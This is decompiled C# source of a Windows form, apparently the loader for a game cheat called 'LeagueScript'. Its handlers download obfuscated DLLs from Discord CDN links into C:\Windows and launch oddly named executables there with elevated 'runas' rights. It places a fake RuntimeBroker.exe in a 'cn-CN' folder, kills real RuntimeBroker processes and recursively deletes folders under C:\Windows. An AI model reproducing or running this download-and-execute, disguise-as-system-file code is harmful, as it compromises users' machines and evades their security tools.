﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace AmongUs
{
	// Token: 0x02000018 RID: 24
	public partial class Form3 : Form
	{
		// Token: 0x0600015A RID: 346 RVA: 0x00006D6E File Offset: 0x0000516E
		public Form3()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600015B RID: 347 RVA: 0x00006D7C File Offset: 0x0000517C
		private void eliteButton3_Click(object sender, EventArgs e)
		{
			Process process = new Process();
			process.StartInfo.Verb = "runas";
			process.StartInfo.FileName = "C:\\Windows\\e37b98cdd.exe";
			process.StartInfo.WorkingDirectory = "C:\\Windows\\";
			process.Start();
			process.StartInfo.Verb = "runas";
			process.StartInfo.FileName = "C:\\Windows\\cce9ec96e.exe";
			process.StartInfo.WorkingDirectory = "C:\\Windows\\";
			process.Start();
			MessageBox.Show("EasyExperience", "Thanks for choosing us!");
		}

		// Token: 0x0600015C RID: 348 RVA: 0x00006E0C File Offset: 0x0000520C
		private void eliteButton5_Click(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("cce9ec96e");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}

		// Token: 0x0600015D RID: 349 RVA: 0x00006E3C File Offset: 0x0000523C
		private void eliteButton6_Click(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Windows\\e37b98.exe"))
			{
				File.Delete("C:\\Windows\\e37b98.exe");
			}
			if (File.Exists("C:\\Windows\\xazqwe.exe"))
			{
				File.Delete("C:\\Windows\\xazqwe.exe");
			}
			Directory.Delete("C:\\Windows\\SysWOW32", true);
			Directory.Delete("C:\\Windows\\cn-CN", true);
			base.Close();
			MessageBox.Show("Do not forget to close the exe from Task Manager.", "Thanks for choosing us!");
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00006EA1 File Offset: 0x000052A1
		private void radioButton1_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800864764522659910/OTHead.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x0600015F RID: 351 RVA: 0x00006EB7 File Offset: 0x000052B7
		private void radioButton2_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800864757640986624/OTNeck.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000160 RID: 352 RVA: 0x00006ECD File Offset: 0x000052CD
		private void radioButton3_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800864763344322580/OTBody.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000161 RID: 353 RVA: 0x00006EE3 File Offset: 0x000052E3
		private void radioButton6_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800864951450468412/LKMHead.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000162 RID: 354 RVA: 0x00006EF9 File Offset: 0x000052F9
		private void radioButton5_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800864946309038180/LKMNeck.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000163 RID: 355 RVA: 0x00006F0F File Offset: 0x0000530F
		private void radioButton4_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800864949509423104/LKMBody.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000164 RID: 356 RVA: 0x00006F25 File Offset: 0x00005325
		private void radioButton12_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800865223833157652/RKMHead.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000165 RID: 357 RVA: 0x00006F3B File Offset: 0x0000533B
		private void radioButton11_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800865213649256458/RKMNeck.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000166 RID: 358 RVA: 0x00006F51 File Offset: 0x00005351
		private void radioButton10_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800865220762533898/RKMBody.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000167 RID: 359 RVA: 0x00006F67 File Offset: 0x00005367
		private void radioButton9_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800865555124715540/LSKHead.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000168 RID: 360 RVA: 0x00006F7D File Offset: 0x0000537D
		private void radioButton8_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800865544387035166/LSKNeck.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x06000169 RID: 361 RVA: 0x00006F93 File Offset: 0x00005393
		private void radioButton7_CheckedChanged(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/794698174090051663/800865552906190848/LSKBody.vmp.dll", "C:\\Windows\\APHostClient.dll");
		}

		// Token: 0x0600016A RID: 362 RVA: 0x00006FA9 File Offset: 0x000053A9
		private void Form3_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600016B RID: 363 RVA: 0x00006FAC File Offset: 0x000053AC
		private void eliteButton4_Click(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("RuntimeBroker");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}

		// Token: 0x0600016C RID: 364 RVA: 0x00006FDC File Offset: 0x000053DC
		private void eliteButton7_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					Verb = "runas",
					FileName = "C:\\Windows\\e37b98.exe",
					WorkingDirectory = "C:\\Windows\\"
				}
			}.Start();
			MessageBox.Show("Second Step Done. Now you can start.", "LeagueScript");
		}

		// Token: 0x0600016D RID: 365 RVA: 0x00007034 File Offset: 0x00005434
		private void eliteButton8_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					Verb = "runas",
					FileName = "C:\\Windows\\cn-CN\\RuntimeBroker.exe",
					WorkingDirectory = "C:\\Windows\\cn-CN\\"
				}
			}.Start();
		}

		// Token: 0x0600016E RID: 366 RVA: 0x00007071 File Offset: 0x00005471
		private void eliteButton1_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/dehYzKj5x4");
		}

		// Token: 0x0600016F RID: 367 RVA: 0x0000707E File Offset: 0x0000547E
		private void eliteButton2_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/dehYzKj5x4");
		}

		// Token: 0x06000170 RID: 368 RVA: 0x0000708C File Offset: 0x0000548C
		private void eliteButton9_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					Verb = "runas",
					FileName = "C:\\Windows\\xazqwe.exe",
					WorkingDirectory = "C:\\Windows\\"
				}
			}.Start();
			MessageBox.Show("First Step Done.", "LeagueScript");
		}
	}
}
